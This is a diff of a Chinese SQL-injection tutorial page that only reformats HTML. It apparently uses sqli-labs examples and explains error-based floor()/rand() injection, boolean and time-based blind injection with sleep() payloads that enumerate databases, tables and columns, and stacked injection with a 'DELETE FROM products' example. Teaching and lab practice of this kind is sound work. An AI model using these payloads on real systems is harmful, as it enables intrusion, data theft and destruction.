@@ -154,67 +154,12 @@ eg:select extractvalue(1,concat(’ ~ &#39;,user()));
 之后的可以和联合注入一样
 </code></pre>
 <p><a name="ad74199a"></a></p>
-<h6 id="2-floor报错-主键冲突（重复）"><a href="#2-floor报错-主键冲突（重复）" class="headerlink" title="2. floor报错(主键冲突（重复）)"></a>2. floor报错(主键冲突（重复）)</h6><pre><code>主键重复方式的报错注入利用的函数有： floor() + rand() + group() + count()
-
-利用 select count(\*),(floor(rand(0)\*2)) x from users group by x这个相对固定的语句格式，导致的数据库报错
-
-理解rand函数:rand()是一个随机函数，通过一个固定的随机数的种子0之后，
-
-产生大于等于0小于1的伪随机序列&lt;br /&gt;    理解floor(rand(0)\*2)
-
-floor() 函数的作用就是返回小于等于括号内该值的最大整数，也就是取整。
-
-floor(rand(0)\*2) 得到伪随机数列011011,因为使用了固定的随机数种子0，他每次产生的随机数列都是相同的0 1 1 0 1 1的顺序。&lt;br /&gt;    理解group by:group by进行分组排序相同名字合并&lt;br /&gt;    理解count()函数:对a中的重复性的数据进行了整合，然后计数，后面的x就是每一类的数量。
-</code></pre>
+<h6 id="2-floor报错-主键冲突（重复）"><a href="#2-floor报错-主键冲突（重复）" class="headerlink" title="2. floor报错(主键冲突（重复）)"></a>2. floor报错(主键冲突（重复）)</h6><p>主键重复方式的报错注入利用的函数有： floor() + rand() + group() + count()<br>利用 select count(*),(floor(rand(0)*2)) x from users group by x这个相对固定的语句格式，导致的数据库报错<br>理解rand函数:rand()是一个随机函数，通过一个固定的随机数的种子0之后，<br>产生大于等于0小于1的伪随机序列<br>理解floor(rand(0)*2)<br>floor() 函数的作用就是返回小于等于括号内该值的最大整数，也就是取整。<br>floor(rand(0)*2) 得到伪随机数列011011,因为使用了固定的随机数种子0，他每次产生的随机数列都是相同的0 1 1 0 1 1的顺序。<br>理解group by:group by进行分组排序相同名字合并<br>理解count()函数:对a中的重复性的数据进行了整合，然后计数，后面的x就是每一类的数量。</p>
 <p><a name="eae5442e"></a></p>
 <h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><p><a name="328a1cab"></a></p>
-<h6 id="1-布尔注入"><a href="#1-布尔注入" class="headerlink" title="1.  布尔注入"></a>1.  布尔注入</h6><pre><code>sql时间盲注指的是：页面没有回显，使用布尔盲注，利用页面是否正确响应看是否存在sql注入。
-
-注入流程
-
-    第一步：判断是否可以注入，和以前的方式一样，使用‘ 或者 “进行判断
-
-    第二步，同样的，使用order by 判断列数
-
-    第三步：就要构造语句来进行猜解数据长度和库名：
-
-    eg： and length(database())=8--+
-
-    ?id=1&#39; and (ascii(substr(database(),1,1)) &gt;100) --+
-</code></pre>
+<h6 id="1-布尔注入"><a href="#1-布尔注入" class="headerlink" title="1.  布尔注入"></a>1.  布尔注入</h6><p>sql时间盲注指的是：页面没有回显，使用布尔盲注，利用页面是否正确响应看是否存在sql注入。<br>注入流程<br>第一步：判断是否可以注入，和以前的方式一样，使用‘ 或者 “进行判断<br>第二步，同样的，使用order by 判断列数<br>第三步：就要构造语句来进行猜解数据长度和库名：<br>eg： and length(database())=8–+<br>?id=1’ and (ascii(substr(database(),1,1)) &gt;100) –+</p>
 <p><a name="bbc335e0"></a></p>
-<h6 id="2-时间盲注"><a href="#2-时间盲注" class="headerlink" title="2.  时间盲注"></a>2.  时间盲注</h6><pre><code>sql时间盲注指的是：页面没有回显，使用时间盲注，利用页面响应的时间看是否存在sql注入。
-
-注入过程
-
-    id=1&#39; and if(length(database())&gt;1,sleep(2),0) --+
-
-    增加1值来猜库名的长度
-
-    id=1&#39; and if(ascii(substr(database(),1,1))&gt;114,sleep(2),0) --+
-
-    增加1值，对照ascii表查询库名
-
-    id=1’ and if(ascii(substr((select table\_name from
-
-    information\_schema.tables where table\_schema=&#39;security&#39; limit 0,1),1,1))&gt;101,sleep(1),0)--+
-
-    增加1值，对照ascii表查询表名
-
-    id=1&#39; and if(ascii(substr((select column\_name from
-
-    information\_schema.columns where table\_schema=database()
-
-    and table\_name=&#39;emails&#39; limit 0,1),1,1))&gt;104,sleep(1),0)--+
-
-    增加1值，对照ascii表查询列名
-
-    id=1&#39; and if(ascii(substr((select id from emails limit
-
-    0,1),1,1))&gt;49,sleep(1),0)--+
-
-    根据表名和列名进行暴值
-</code></pre>
+<h6 id="2-时间盲注"><a href="#2-时间盲注" class="headerlink" title="2.  时间盲注"></a>2.  时间盲注</h6><p>ql时间盲注指的是：页面没有回显，使用时间盲注，利用页面响应的时间看是否存在sql注入。<br>注入过程<br>id=1’ and if(length(database())&gt;1,sleep(2),0) –+<br>增加1值来猜库名的长度<br>id=1’ and if(ascii(substr(database(),1,1))&gt;114,sleep(2),0) –+<br>增加1值，对照ascii表查询库名<br>id=1’ and if(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1))&gt;101,sleep(1),0)–+<br>增加1值，对照ascii表查询表名<br>id=1’ and if(ascii(substr((select column_name from<br>information_schema.columns where table_schema=database()and table_name=’emails’ limit 0,1),1,1))&gt;104,sleep(1),0)–+<br>增加1值，对照ascii表查询列名<br>id=1’ and if(ascii(substr((select id from emails limit0,1),1,1))&gt;49,sleep(1),0)–+<br>根据表名和列名进行暴值</p>
 <p><a name="fa662c87"></a></p>
 <h5 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h5><p>原理：在SQL语句中，语句的结束都是以<code>;</code>结尾，但是如果我们在<code>;</code>后面再加上一条SQL语句，两条语句会一起执行吗？这也就是造成堆叠注入的原因了区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。</p>
 <p>用户输入：1; DELETE FROM products服务器端生成的sql语句为：</p>
